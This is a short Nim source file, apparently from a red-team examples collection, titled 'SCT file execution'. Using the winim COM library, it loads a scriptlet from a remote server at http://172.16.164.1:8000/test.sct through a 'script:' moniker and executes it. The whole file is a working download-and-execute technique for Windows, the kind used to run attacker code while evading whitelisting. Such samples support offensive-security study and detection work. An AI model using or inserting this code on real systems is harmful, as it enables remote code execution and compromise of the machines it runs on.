#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    SCT file execution
]#

import winim/com

var scriptlet = GetObject("script:http://172.16.164.1:8000/test.sct")
scriptlet.Exec()